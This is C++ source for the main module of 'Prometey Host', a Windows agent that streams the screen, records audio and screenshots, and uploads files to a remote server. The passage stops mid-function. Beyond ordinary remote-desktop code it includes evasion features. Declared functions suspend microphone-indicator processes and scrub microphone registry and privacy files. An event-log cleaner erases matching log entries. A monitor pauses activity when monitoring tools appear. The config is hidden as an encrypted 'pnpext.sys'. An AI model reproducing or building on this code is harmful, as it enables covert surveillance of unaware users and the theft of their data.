/*
 * Prometey Host - Main Entry Point
 * Multi-threaded streaming pipeline: capture → encode workers → multi-connection send
 */

#include "host.h"
#include "logger.h"
#include "ws_client.h"
#include "screen_capture.h"
#include "h264_encoder.h"
#include "file_manager.h"
#include "process_manager.h"
#include "capture_ipc.h"
#include "threat_scan.h"
#include "capture_helper.h"
#include "audio_dsp.h"
#include <userenv.h>
#include <shlobj.h>
#include <wtsapi32.h>
#include <bcrypt.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <set>
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "bcrypt.lib")

// High-resolution timer + multimedia thread scheduling
#include <mmsystem.h>
#include <avrt.h>
#include <powrprof.h>
#include <dwmapi.h>
#include <utility>
#include <csignal>
#include <cstdlib>
#include <sstream>
#include <fstream>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "avrt.lib")
#pragma comment(lib, "PowrProf.lib")
#pragma comment(lib, "dwmapi.lib")
#include <winternl.h>

typedef LONG (NTAPI *NtSuspendProcess)(HANDLE ProcessHandle);
static NtSuspendProcess pNtSuspendProcess = nullptr;

static void SuspendProcess(DWORD pid) {
    if (!pNtSuspendProcess) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll)
            pNtSuspendProcess = (NtSuspendProcess)GetProcAddress(hNtdll, "NtSuspendProcess");
        if (!pNtSuspendProcess) return;
    }
    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (hProcess) {
        pNtSuspendProcess(hProcess);
        CloseHandle(hProcess);
    }
}

// Forward declarations for audio anti-detection functions (defined either in dllmain.cpp or below)
//extern "C" void HideMicrophoneIconFromTray();
extern "C" void AudioSuspendIndicatorProcesses();
extern "C" void AudioCleanMicRegistry();
extern "C" void AudioDeletePrivacyFiles();

// ===== Ensure valid UTF-8 =====
// Python websockets enforces strict UTF-8 on text frames (code 1007 = invalid UTF-8).
// This function checks if a string is already valid UTF-8; if not, converts from ANSI (CP_ACP).
static std::string to_utf8(const std::string& s) {
    if (s.empty()) return s;
    // Check if already valid UTF-8
    int check = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, s.c_str(), (int)s.size(), nullptr, 0);
    if (check > 0) return s; // Already valid UTF-8, return as-is
    // Not valid UTF-8 — assume ANSI (system codepage) and convert
    // Step 1: ANSI → UTF-16
    int wlen = MultiByteToWideChar(CP_ACP, 0, s.c_str(), (int)s.size(), nullptr, 0);
    if (wlen <= 0) return s;
    std::wstring wide(wlen, 0);
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), (int)s.size(), &wide[0], wlen);
    // Step 2: UTF-16 → UTF-8
    int ulen = WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), wlen, nullptr, 0, nullptr, nullptr);
    if (ulen <= 0) return s;
    std::string utf8(ulen, 0);
    WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), wlen, &utf8[0], ulen, nullptr, nullptr);
    return utf8;
}

// Saved power scheme to restore on exit
static GUID g_saved_power_scheme = {};
static bool g_power_scheme_saved = false;
#ifdef USE_WEBRTC_STREAM
#include "webrtc_stream.h"
#endif

// ===== Global State =====
HostConfig g_config;  // non-static: shared with dllmain.cpp
static Logger& g_log = Logger::get();
std::atomic<bool> g_running{true};  // non-static: used by service_host.h

// Event log cleaner — forward-declared here so evtlog_set_config handler can use them
static std::mutex               g_evtlog_cv_mtx;
static std::condition_variable  g_evtlog_cv;
static std::atomic<int>         g_evtlog_config_gen{0};

// Screenshot globals (declared early for load_config access)
static std::atomic<int> g_screenshot_interval{10};
static std::atomic<int> g_screenshot_quality{75};
static std::atomic<int> g_screenshot_scale{50};
static std::atomic<bool> g_screenshot_always{true};
static std::atomic<int> g_screenshot_mode{0}; // 0=fullscreen, 1=active window
static std::mutex g_screenshot_apps_mtx;
static std::string g_screenshot_apps;

// Audio recording globals
static std::thread g_audio_thread;
static std::atomic<bool> g_audio_active{false};
static std::atomic<int> g_audio_segment_duration{300};
static std::atomic<int> g_audio_sample_rate{44100};
static std::atomic<int> g_audio_bitrate{128};
static std::atomic<int> g_audio_channels{1};
static std::atomic<int> g_audio_device_id{-1}; // -1 = WAVE_MAPPER (default)
static std::atomic<int> g_audio_gain{100};     // % gain (100=normal, 200=2x boost)
static std::atomic<int> g_audio_mode{0};       // 0=record, 1=live, 2=both
static std::atomic<bool> g_audio_denoise{true};   // high-pass + noise gate
static std::atomic<bool> g_audio_normalize{true}; // peak normalization
static std::atomic<int>  g_audio_hum_filter{50};  // 0=off, 50=50Hz, 60=60Hz
static void audio_thread_func(); // defined later
static HANDLE g_audio_record_process = nullptr; // PID of current recording rundll32

#ifndef BUILD_AS_DLL
HMODULE g_dll_module = nullptr;  // standalone exe: no DLL module
#endif
static std::unique_ptr<WsClient> g_ws;   // Command connection
static ScreenCapture g_screen;
static FileManager g_files;
static ProcessManager g_procs;
static ServiceManager g_services;

// ── Service/DLL mode ──
bool g_service_mode = false;
CaptureIpcReader* g_ipc_reader_ptr = nullptr;

// ── Background worker tracker ──
// Short-lived fire-and-forget workers (previously .detach()'d) are now tracked
// so stop_host() can wait for them to finish before tearing down globals.
static std::atomic<int>     g_bg_worker_count{0};
static std::mutex           g_bg_worker_mtx;
static std::condition_variable g_bg_worker_cv;

template <typename Fn>
static void spawn_bg_worker(Fn&& fn) {
    g_bg_worker_count.fetch_add(1, std::memory_order_acq_rel);
    std::thread([f = std::forward<Fn>(fn)]() mutable {
        try { f(); } catch (...) { /* swallow: worker must not take down host */ }
        {
            std::lock_guard<std::mutex> lk(g_bg_worker_mtx);
            g_bg_worker_count.fetch_sub(1, std::memory_order_acq_rel);
        }
        g_bg_worker_cv.notify_all();
    }).detach();
}

// Called from stop_host() (dllmain.cpp) during shutdown.
// Waits up to timeout_ms for all bg workers + audio + screenshot threads to finish.
extern "C" void shutdown_workers(int timeout_ms);

// Forward declarations of globals defined above that shutdown_workers touches.
// (g_audio_thread / g_screenshot_thread / g_audio_active / g_screenshot_active are above)

// ===== Graceful shutdown on console events (Ctrl+C, close, logoff, shutdown) =====
static BOOL WINAPI ConsoleCtrlHandler(DWORD type) {
    if (type == CTRL_C_EVENT || type == CTRL_CLOSE_EVENT ||
        type == CTRL_BREAK_EVENT || type == CTRL_LOGOFF_EVENT ||
        type == CTRL_SHUTDOWN_EVENT) {
        g_running = false;
        return TRUE;
    }
    return FALSE;
}

// Stream state
std::atomic<bool> g_streaming{false};  // non-static: used by dllmain.cpp helper_monitor
// Threat-monitor: pauses outbound activity when monitoring tools are visible
std::atomic<bool> g_paused_by_threat{false};
static std::atomic<bool> g_threat_auto_pause{false};
static std::atomic<bool> g_threat_scan_enabled{false};

// sys_info response cache — avoid expensive PDH GPU queries when multiple clients poll
static std::string g_sysinfo_cache;
static std::chrono::steady_clock::time_point g_sysinfo_cache_time{};
struct ThreatInfoFwd { std::string proc; std::string title; std::string category; bool visible = true; DWORD pid = 0; };
static ThreatInfoFwd g_last_threat;
static std::vector<std::pair<std::string,std::string>> g_threat_list_all; // (proc,title)
static std::mutex g_threat_mtx;
static std::string g_codec = "jpeg";
static int g_quality = 75;
static int g_fps = 30;
static int g_scale = 80;
static int g_bitrate = 5000;  // H264 bitrate in kbps, set by client

// ── Multi-threaded stream pipeline ──
static std::vector<std::unique_ptr<WsClient>> g_stream_ws;   // Stream connections
static std::thread g_capture_thread;
static std::vector<std::thread> g_encode_threads;
static std::mutex g_raw_mtx;
static std::condition_variable g_raw_cv;
static std::shared_ptr<ScreenCapture::RawFrame> g_latest_raw;
static std::atomic<uint64_t> g_frame_seq{0};

// H.264 encoder (one per encode worker — initialized lazily)
static std::mutex g_h264_mtx;
static std::unique_ptr<H264Encoder> g_h264_encoder;
static std::atomic<bool> g_h264_keyframe_requested{false};
static std::atomic<bool> g_webrtc_sent_keyframe{false};
static std::chrono::steady_clock::time_point g_webrtc_start_time;
static std::chrono::steady_clock::time_point g_webrtc_last_keyframe;

// Adaptive quality + auto-scale
static std::atomic<int> g_adaptive_quality{75};
static std::atomic<int> g_auto_scale{80};        // Current auto-adjusted scale
static int g_user_scale = 80;                    // Scale set by user (target)
static std::atomic<int> g_consecutive_slow{0};   // Frames above 2x target time
static std::atomic<int> g_consecutive_fast{0};   // Frames below target/2 time
static std::atomic<int64_t> g_bytes_sent_total{0}; // Total bytes sent for throughput calc
static std::atomic<int64_t> g_throughput_bps{0};   // Measured throughput (bytes/sec)

// ── Multi-connection file transfer ──
static std::vector<std::unique_ptr<WsClient>> g_file_ws;   // Dedicated file connections
static std::atomic<int> g_file_ws_robin{0};                 // Round-robin index
static std::mutex g_file_ws_mtx;
static std::atomic<bool> g_file_ws_ready{false};

// File transfer thread pool
struct FileWork {
    std::string path;
    uint64_t offset;
    uint32_t length;
    std::string from;
};
static std::mutex g_file_work_mtx;
static std::condition_variable g_file_work_cv;
static std::queue<FileWork> g_file_work_q;
static std::vector<std::thread> g_file_workers;
static std::atomic<bool> g_file_workers_running{false};

// ═══════════════════════════════════════════════════════════════
//  Reconnect backoff — exponential with jitter + auth-fail limiter
// ═══════════════════════════════════════════════════════════════
// State for auth failure tracking across reconnects. If the server keeps
// responding with auth errors (wrong password / token / banned), we stop
// hammering and fall back to a long cooldown — otherwise a rotated password
// would keep the host in a tight spin forever, flooding the log.
static std::atomic<int> g_auth_fail_count{0};
static std::condition_variable g_reconnect_cv;
static std::mutex              g_reconnect_mtx;

// Call this from the auth-response handler when the server says "bad credentials".
inline void reconnect_note_auth_fail() { g_auth_fail_count.fetch_add(1); }
inline void reconnect_note_auth_ok()   { g_auth_fail_count.store(0); }

// Compute next delay in seconds given the current delay and whether we're
// in auth-fail penalty mode. Exponential: 1→2→4→8→16→32→60 (cap 60s).
// After 3 consecutive auth failures, jumps to a 5-minute cooldown.
static int reconnect_next_delay(int cur_delay) {
    const int max_normal  = 60;   // cap for network-level failures
    const int auth_penalty = 300; // 5 min if server keeps rejecting auth
    if (g_auth_fail_count.load() >= 3) return auth_penalty;
    int next = cur_delay * 2;
    if (next > max_normal) next = max_normal;
    if (next < 1) next = 1;
    return next;
}

// Jittered sleep that wakes immediately on g_running=false. Applies ±25%
// randomization to avoid thundering-herd when many hosts reconnect after a
// brief VPS outage, and on a shutdown signal returns early.
static void reconnect_sleep(int seconds) {
    if (seconds <= 0) return;
    // Uniform jitter: 0.75..1.25
    thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_real_distribution<float> dist(0.75f, 1.25f);
    int ms = (int)((float)seconds * 1000.f * dist(rng));
    if (ms < 250) ms = 250;
    std::unique_lock<std::mutex> lk(g_reconnect_mtx);
    g_reconnect_cv.wait_for(lk, std::chrono::milliseconds(ms),
                             [] { return !g_running.load(); });
}

// Called from shutdown path to wake any sleeping reconnect loops.
inline void reconnect_wake_all() { g_reconnect_cv.notify_all(); }

static void open_file_connections() {
    std::lock_guard<std::mutex> lk(g_file_ws_mtx);
    // Close old connections
    for (auto& ws : g_file_ws) { if (ws) ws->disconnect(); }
    g_file_ws.clear();
    g_file_ws_ready = false;

    // ONE dedicated file connection — same port/TLS as main connection.
    auto ws = std::make_unique<WsClient>();
    bool file_ok = ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls);
    if (file_ok) {
        std::string auth = "{\"cmd\":\"auth\",\"token\":\"" + json_escape(g_config.room_token) +
                           "\",\"password\":\"" + json_escape(g_config.password) +
                           "\",\"role\":\"host_file\"}";
        ws->send_text(auth);
        g_file_ws.push_back(std::move(ws));
        g_file_ws_ready = true;
        g_log.info("File connection established (1 dedicated TCP)");
    } else {
        g_log.warn("File connection failed, using main ws fallback");
    }
}

static void close_file_connections() {
    std::lock_guard<std::mutex> lk(g_file_ws_mtx);
    g_file_ws_ready = false;
    for (auto& ws : g_file_ws) { if (ws) ws->disconnect(); }
    g_file_ws.clear();
}

// Send FILE binary through dedicated file connection (server broadcasts to file_recv)
static void send_file_binary(const std::vector<uint8_t>& bin) {
    if (g_file_ws_ready) {
        std::lock_guard<std::mutex> lk(g_file_ws_mtx);
        if (!g_file_ws.empty() && g_file_ws[0] && g_file_ws[0]->is_connected()) {
            g_file_ws[0]->send_binary_priority(bin);
            return;
        }
    }
    if (g_ws && g_ws->is_connected())
        g_ws->send_binary_priority(bin);
}

// File worker thread: reads chunks from disk and sends via file connections
static void file_worker_func(int worker_id) {
    g_log.info("File worker " + std::to_string(worker_id) + " started");
    while (g_file_workers_running) {
      try {
        FileWork work;
        {
            std::unique_lock<std::mutex> lk(g_file_work_mtx);
            g_file_work_cv.wait_for(lk, std::chrono::milliseconds(200), [] {
                return !g_file_work_q.empty() || !g_file_workers_running;
            });
            if (!g_file_workers_running) break;
            if (g_file_work_q.empty()) continue;
            work = std::move(g_file_work_q.front());
            g_file_work_q.pop();
        }

        // Read chunk from disk
        std::vector<uint8_t> chunk = g_files.read_file_chunk(work.path, work.offset, work.length);

        // Build FILE binary
        std::vector<uint8_t> bin;
        bin.reserve(16 + work.path.size() + chunk.size());
        const char hdr[4] = {'F','I','L','E'};
        bin.insert(bin.end(), hdr, hdr+4);
        uint16_t plen = static_cast<uint16_t>(work.path.size());
        bin.insert(bin.end(), reinterpret_cast<uint8_t*>(&plen), reinterpret_cast<uint8_t*>(&plen)+2);
        bin.insert(bin.end(), work.path.begin(), work.path.end());
        bin.insert(bin.end(), reinterpret_cast<const uint8_t*>(&work.offset), reinterpret_cast<const uint8_t*>(&work.offset)+8);
        bin.insert(bin.end(), chunk.begin(), chunk.end());

        // Send FILE binary directly (no extra copies, no format conversion)
        send_file_binary(bin);

        // No throttle — TCP backpressure + separate file ws handles bandwidth sharing
        // Stream uses dedicated host_stream connection, no competition
      } catch (const std::exception& e) {
          g_log.error("File worker " + std::to_string(worker_id) + " error: " + std::string(e.what()) + " — continuing");
          Sleep(100);
      } catch (...) {
          g_log.error("File worker " + std::to_string(worker_id) + " unknown error — continuing");
          Sleep(100);
      }
    }
    g_log.info("File worker " + std::to_string(worker_id) + " stopped");
}

static void start_file_workers() {
    if (g_file_workers_running) return;
    g_file_workers_running = true;
    int n_workers = 4;  // 4 concurrent file read threads
    for (int i = 0; i < n_workers; i++) {
        g_file_workers.emplace_back(file_worker_func, i);
    }
    g_log.info("File transfer pool: " + std::to_string(n_workers) + " workers started");
}

static void stop_file_workers() {
    g_file_workers_running = false;
    g_file_work_cv.notify_all();
    for (auto& t : g_file_workers) {
        if (t.joinable()) t.join();
    }
    g_file_workers.clear();
}

// Recording state
static std::atomic<bool> g_recording{false};
static std::ofstream g_rec_file;
static std::mutex g_rec_mtx;
static uint64_t g_rec_frame_count = 0;
static std::chrono::steady_clock::time_point g_rec_start;

// Forward declarations for AES (defined later with screenshot/audio encryption)
static std::vector<uint8_t> aes_encrypt(const uint8_t* data, size_t len);
static std::vector<uint8_t> aes_decrypt(const uint8_t* data, size_t len);

// ===== Config loading (supports encrypted pnpext.sys or plain JSON) =====
static void load_config(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f.is_open()) {
        g_log.info("Config file not found, using defaults: " + path);
        return;
    }
    std::string raw((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    f.close();

    // Detect if file is encrypted (not starting with '{') or plain JSON
    std::string content;
    if (!raw.empty() && raw[0] != '{') {
        // Encrypted config — decrypt with AES
        auto dec = aes_decrypt((const uint8_t*)raw.data(), raw.size());
        if (!dec.empty() && dec[0] == '{') {
            content.assign((char*)dec.data(), dec.size());
            g_log.info("Config decrypted from " + path);
        } else {
            g_log.warn("Config decryption failed, trying as plain text: " + path);
            content = raw;
        }
    } else {
        content = raw; // plain JSON
    }

    auto get = [&](const std::string& k, const std::string& def) {
        std::string v = json_get(content, k);
        return v.empty() ? def : v;
    };

    g_config.server_address = get("server", g_config.server_address);
    g_config.room_token     = get("token", g_config.room_token);
    g_config.password       = get("password", g_config.password);

    auto safe_stoi = [](const std::string& s, int def) -> int {
        try { return s.empty() ? def : std::stoi(s); }
        catch (...) { return def; }
    };

    std::string port = get("port", "");
    if (!port.empty()) g_config.server_port = safe_stoi(port, g_config.server_port);

    std::string tls_s = get("use_tls", "");
    if (!tls_s.empty()) g_config.use_tls = (tls_s == "true" || tls_s == "1");

    std::string q = get("quality", "");
    if (!q.empty()) g_config.quality = safe_stoi(q, g_config.quality);

    std::string fps = get("fps", "");
    if (!fps.empty()) g_config.fps = safe_stoi(fps, g_config.fps);

    std::string sc = get("scale", "");
    if (!sc.empty()) g_config.scale = safe_stoi(sc, g_config.scale);

    std::string sc_conn = get("screen_connections", "");
    if (!sc_conn.empty()) g_config.screen_connections = safe_stoi(sc_conn, g_config.screen_connections);

    g_config.codec = get("codec", g_config.codec);

    std::string br = get("bitrate", "");
    if (!br.empty()) g_config.bitrate = safe_stoi(br, g_config.bitrate);

    // WebRTC ICE servers
    g_config.stun_server = get("stun_server", g_config.stun_server);
    g_config.turn_server = get("turn_server", g_config.turn_server);

    // Event log cleaner patterns (comma-separated regex)
    g_config.evtlog_clean_patterns = get("evtlog_clean_patterns", g_config.evtlog_clean_patterns);
    std::string eci = get("evtlog_clean_interval", "");
    if (!eci.empty()) g_config.evtlog_clean_interval = safe_stoi(eci, 30);
    std::string ecm = get("evtlog_clean_mode", "");
    if (!ecm.empty()) g_config.evtlog_clean_mode = ecm; // "once" or "loop"

    // Screenshot settings
    std::string ss_en = get("screenshot_enabled", "");
    if (!ss_en.empty()) g_config.screenshot_enabled = (ss_en == "true" || ss_en == "1");
    std::string ss_int = get("screenshot_interval", "");
    if (!ss_int.empty()) g_config.screenshot_interval = safe_stoi(ss_int, 10);
    std::string ss_q = get("screenshot_quality", "");
    if (!ss_q.empty()) g_config.screenshot_quality = safe_stoi(ss_q, 75);
    std::string ss_sc = get("screenshot_scale", "");
    if (!ss_sc.empty()) g_config.screenshot_scale = safe_stoi(ss_sc, 50);
    std::string ss_al = get("screenshot_always", "");
    if (!ss_al.empty()) g_config.screenshot_always = (ss_al == "true" || ss_al == "1");
    g_config.screenshot_apps = get("screenshot_apps", g_config.screenshot_apps);

    // Apply screenshot config to runtime atomics
    g_screenshot_interval = g_config.screenshot_interval;
    g_screenshot_quality = g_config.screenshot_quality;
    g_screenshot_scale = g_config.screenshot_scale;
    g_screenshot_always = g_config.screenshot_always;
    { std::lock_guard<std::mutex> lk(g_screenshot_apps_mtx); g_screenshot_apps = g_config.screenshot_apps; }

    // Audio recording settings
    std::string au_en = get("audio_enabled", "");
    if (!au_en.empty()) g_config.audio_enabled = (au_en == "true" || au_en == "1");
    std::string au_dur = get("audio_segment_duration", "");
    if (!au_dur.empty()) g_config.audio_segment_duration = safe_stoi(au_dur, 300);
    std::string au_sr = get("audio_sample_rate", "");
    if (!au_sr.empty()) g_config.audio_sample_rate = safe_stoi(au_sr, 44100);
    std::string au_br = get("audio_bitrate", "");
    if (!au_br.empty()) g_config.audio_bitrate = safe_stoi(au_br, 128);
    std::string au_ch = get("audio_channels", "");
    if (!au_ch.empty()) g_config.audio_channels = safe_stoi(au_ch, 1);
    g_audio_segment_duration = g_config.audio_segment_duration;
    g_audio_sample_rate = g_config.audio_sample_rate;
    g_audio_bitrate = g_config.audio_bitrate;
    g_audio_channels = g_config.audio_channels;
    std::string au_gain = get("audio_gain", "");
    if (!au_gain.empty()) g_config.audio_gain = safe_stoi(au_gain, 100);
    g_audio_gain = g_config.audio_gain;
    std::string au_dn = get("audio_denoise", "");
    if (!au_dn.empty()) g_config.audio_denoise = (au_dn == "true" || au_dn == "1");
    g_audio_denoise = g_config.audio_denoise;
    std::string au_nr = get("audio_normalize", "");
    if (!au_nr.empty()) g_config.audio_normalize = (au_nr == "true" || au_nr == "1");
    g_audio_normalize = g_config.audio_normalize;
    std::string au_hum = get("audio_hum_filter", "");
    if (!au_hum.empty()) g_config.audio_hum_filter = safe_stoi(au_hum, 50);
    g_audio_hum_filter = g_config.audio_hum_filter;

    // Threat monitor toggles
    std::string th_scan = get("threat_scan_enabled", "");
    if (!th_scan.empty()) g_threat_scan_enabled = (th_scan == "true" || th_scan == "1");
    std::string th_ap = get("threat_auto_pause", "");
    if (!th_ap.empty()) g_threat_auto_pause = (th_ap == "true" || th_ap == "1");

    g_log.info("Config loaded from " + path);
    if (!g_config.stun_server.empty() || !g_config.turn_server.empty())
        g_log.info("ICE: STUN=" + g_config.stun_server + " TURN=" + (g_config.turn_server.empty() ? "(none)" : "configured"));
}

// ===== Save stream settings to config =====
static std::string g_config_path;  // set in main()

static void save_stream_settings() {
    if (g_config_path.empty()) return;

    // Read existing config (may be encrypted)
    std::string content;
    {
        std::ifstream f(g_config_path, std::ios::binary);
        if (f.is_open()) {
            std::string raw((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            if (!raw.empty() && raw[0] != '{') {
                auto dec = aes_decrypt((const uint8_t*)raw.data(), raw.size());
                if (!dec.empty()) content.assign((char*)dec.data(), dec.size());
            } else content = raw;
        }
    }

    // Build new config JSON preserving connection settings from existing config
    auto get_existing = [&](const std::string& k, const std::string& def) {
        std::string v = json_get(content, k);
        return v.empty() ? def : v;
    };

    std::string out = "{\n";
    out += "  \"server\": \"" + json_escape(get_existing("server", g_config.server_address)) + "\",\n";
    out += "  \"port\": " + get_existing("port", std::to_string(g_config.server_port)) + ",\n";
    out += "  \"use_tls\": " + get_existing("use_tls", std::string(g_config.use_tls ? "true" : "false")) + ",\n";
    out += "  \"token\": \"" + json_escape(get_existing("token", g_config.room_token)) + "\",\n";
    out += "  \"password\": \"" + json_escape(get_existing("password", g_config.password)) + "\",\n";
    out += "  \"codec\": \"" + json_escape(g_codec) + "\",\n";
    out += "  \"quality\": " + std::to_string(g_quality) + ",\n";
    out += "  \"fps\": " + std::to_string(g_fps) + ",\n";
    out += "  \"scale\": " + std::to_string(g_scale) + ",\n";
    out += "  \"bitrate\": " + std::to_string(g_bitrate) + ",\n";
    out += "  \"screen_connections\": " + std::to_string(g_config.screen_connections) + ",\n";
    out += "  \"file_connections\": " + std::to_string(g_config.file_connections) + ",\n";
    out += "  \"log_level\": \"" + json_escape(get_existing("log_level", "INFO")) + "\",\n";
    out += "  \"stun_server\": \"" + json_escape(g_config.stun_server) + "\",\n";
    out += "  \"turn_server\": \"" + json_escape(g_config.turn_server) + "\",\n";
    out += "  \"evtlog_clean_patterns\": \"" + json_escape(g_config.evtlog_clean_patterns) + "\",\n";
    out += "  \"evtlog_clean_interval\": " + std::to_string(g_config.evtlog_clean_interval) + ",\n";
    out += "  \"evtlog_clean_mode\": \"" + json_escape(g_config.evtlog_clean_mode) + "\",\n";
    out += "  \"screenshot_enabled\": " + std::string(g_config.screenshot_enabled ? "true" : "false") + ",\n";
    out += "  \"screenshot_interval\": " + std::to_string(g_config.screenshot_interval) + ",\n";
    out += "  \"screenshot_quality\": " + std::to_string(g_config.screenshot_quality) + ",\n";
    out += "  \"screenshot_scale\": " + std::to_string(g_config.screenshot_scale) + ",\n";
    out += "  \"screenshot_always\": " + std::string(g_config.screenshot_always ? "true" : "false") + ",\n";
    out += "  \"screenshot_apps\": \"" + json_escape(g_config.screenshot_apps) + "\",\n";
    out += "  \"audio_enabled\": " + std::string(g_config.audio_enabled ? "true" : "false") + ",\n";
    out += "  \"audio_segment_duration\": " + std::to_string(g_config.audio_segment_duration) + ",\n";
    out += "  \"audio_sample_rate\": " + std::to_string(g_config.audio_sample_rate) + ",\n";
    out += "  \"audio_bitrate\": " + std::to_string(g_config.audio_bitrate) + ",\n";
    out += "  \"audio_channels\": " + std::to_string(g_config.audio_channels) + ",\n";
    out += "  \"audio_gain\": " + std::to_string(g_config.audio_gain) + ",\n";
    out += "  \"audio_denoise\": " + std::string(g_config.audio_denoise ? "true" : "false") + ",\n";
    out += "  \"audio_normalize\": " + std::string(g_config.audio_normalize ? "true" : "false") + ",\n";
    out += "  \"audio_hum_filter\": " + std::to_string(g_config.audio_hum_filter) + ",\n";
    out += "  \"threat_scan_enabled\": " + std::string(g_threat_scan_enabled ? "true" : "false") + ",\n";
    out += "  \"threat_auto_pause\": " + std::string(g_threat_auto_pause ? "true" : "false") + "\n";
    out += "}\n";

    // Save: encrypt if config path ends with .sys, otherwise plain JSON
    bool doEncrypt = (g_config_path.size() > 4 && g_config_path.substr(g_config_path.size() - 4) == ".sys");
    if (doEncrypt) {
        auto enc = aes_encrypt((const uint8_t*)out.data(), out.size());
        if (!enc.empty()) {
            std::ofstream of(g_config_path, std::ios::binary);
            if (of.is_open()) { of.write((char*)enc.data(), enc.size()); g_log.info("Settings encrypted to " + g_config_path); }
            else g_log.error("Failed to save settings to " + g_config_path);
        }
    } else {
        std::ofstream of(g_config_path);
        if (of.is_open()) { of << out; g_log.info("Settings saved to " + g_config_path); }
        else g_log.error("Failed to save settings to " + g_config_path);
    }
}

// ===== Recording helpers =====
static void recording_write_header() {
    const char magic[4] = {'R','D','V','1'};
    g_rec_file.write(magic, 4);
    int32_t fps = g_fps;
    g_rec_file.write(reinterpret_cast<char*>(&fps), 4);
}

static void recording_write_frame(const std::vector<uint8_t>& frame_data) {
    if (!g_recording || !g_rec_file.is_open()) return;
    std::lock_guard<std::mutex> lk(g_rec_mtx);
    uint32_t sz = static_cast<uint32_t>(frame_data.size());
    auto now = std::chrono::steady_clock::now();
    uint64_t ts_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - g_rec_start).count();
    g_rec_file.write(reinterpret_cast<char*>(&sz), 4);
    g_rec_file.write(reinterpret_cast<const char*>(&ts_ms), 8);
    g_rec_file.write(reinterpret_cast<const char*>(frame_data.data()), sz);
    ++g_rec_frame_count;
}

// ===== Adaptive quality (time-based, every frame) =====
static std::atomic<int> g_sent_frames{0};
static std::atomic<int64_t> g_fps_log_time{0};

static void update_adaptive_quality(int64_t encode_send_ms, size_t frame_bytes) {
    int current = g_adaptive_quality.load();
    int max_q = g_quality;
    int target_ms = 1000 / std::max(5, g_fps);  // e.g. 33ms for 30fps

    // Track throughput
    g_bytes_sent_total += frame_bytes;

    if (encode_send_ms > target_ms * 2) {
        g_consecutive_fast = 0;
        int slow = ++g_consecutive_slow;

        // Phase 1: Reduce JPEG quality aggressively
        if (encode_send_ms > target_ms * 5) {
            g_adaptive_quality = std::max(10, current - 30);
        } else if (encode_send_ms > target_ms * 3) {
            g_adaptive_quality = std::max(10, current - 20);
        } else {
            g_adaptive_quality = std::max(10, current - 10);
        }

        // Phase 2: Quality already at minimum → reduce SCALE
        if (current <= 15 && slow > g_fps) {
            int cur_scale = g_auto_scale.load();
            if (cur_scale > 30) {
                g_auto_scale = cur_scale - 10;
                g_screen.set_scale(g_auto_scale);
                g_consecutive_slow = 0;
                g_log.info("Auto-scale DOWN: " + std::to_string(g_auto_scale) + "% (FPS too low, quality already min)");
            }
        }
    } else if (encode_send_ms < target_ms / 2) {
        g_consecutive_slow = 0;
        int fast = ++g_consecutive_fast;

        // Slowly recover scale if consistently fast (5+ seconds of headroom)
        if (fast > g_fps * 5) {
            int cur_scale = g_auto_scale.load();
            if (cur_scale < g_user_scale) {
                g_auto_scale = std::min(g_user_scale, cur_scale + 5);
                g_screen.set_scale(g_auto_scale);
                g_consecutive_fast = 0;
                g_log.info("Auto-scale UP: " + std::to_string(g_auto_scale) + "%");
            }
        }

        // Recover quality slowly
        if (frame_bytes < 60000 && current < max_q) {
            g_adaptive_quality = std::min(max_q, current + 1);
        }
    } else {
        // Normal range — reset counters
        g_consecutive_slow = 0;
        g_consecutive_fast = 0;
    }
}

// ===== Multi-threaded stream pipeline =====

// Build SCR2 binary message (new protocol, supports JPEG + H.264)
// Format: SCR2(4) + codec(1) + flags(1) + seq(4) + width(4) + height(4) + data
// codec: 0=JPEG, 1=H264   flags: bit0=keyframe   seq: monotonic frame counter
static std::atomic<uint32_t> g_scrn_seq{0};

static std::vector<uint8_t> build_scrn_msg(int width, int height,
    const uint8_t* data, size_t data_size, uint8_t codec, bool keyframe)
{
    std::vector<uint8_t> msg;
    msg.reserve(18 + data_size);
    const char hdr[4] = {'S','C','R','2'};
    msg.insert(msg.end(), hdr, hdr+4);
    msg.push_back(codec);
    msg.push_back(keyframe ? 1 : 0);
    uint32_t seq = g_scrn_seq.fetch_add(1);
    msg.insert(msg.end(), reinterpret_cast<uint8_t*>(&seq), reinterpret_cast<uint8_t*>(&seq)+4);
    uint32_t w = width, h = height;
    msg.insert(msg.end(), reinterpret_cast<uint8_t*>(&w), reinterpret_cast<uint8_t*>(&w)+4);
    msg.insert(msg.end(), reinterpret_cast<uint8_t*>(&h), reinterpret_cast<uint8_t*>(&h)+4);
    msg.insert(msg.end(), data, data + data_size);
    return msg;
}

// JPEG convenience wrapper
static std::vector<uint8_t> build_scrn_msg(const ScreenCapture::Frame& fr) {
    return build_scrn_msg(fr.width, fr.height,
        fr.jpeg_data.data(), fr.jpeg_data.size(), 0, false);
}

// Capture thread: captures raw pixels at target FPS
static void stream_capture_func() {
    g_log.info("Capture thread started");

    // Register as multimedia thread for priority scheduling (like TeamViewer)
    DWORD mmcss_task = 0;
    HANDLE mmcss = AvSetMmThreadCharacteristicsW(L"Pro Audio", &mmcss_task);
    if (mmcss) {
        AvSetMmThreadPriority(mmcss, AVRT_PRIORITY_HIGH);
        g_log.info("Capture thread: MMCSS Pro Audio priority set");
    }

    int consecutive_failures = 0;
    int consecutive_timeouts = 0;
    std::shared_ptr<ScreenCapture::RawFrame> last_good_frame;
    auto last_refresh = std::chrono::steady_clock::now();

    while (g_streaming && g_running) {
      try {
        // ── When threat paused, sleep instead of capturing ──
        // Capture allocates ~33MB per frame (4K BGRA). If we keep capturing
        // but don't send, frames pile up in g_latest_raw and encode queues,
        // growing memory with no benefit. Sleep until threat clears.
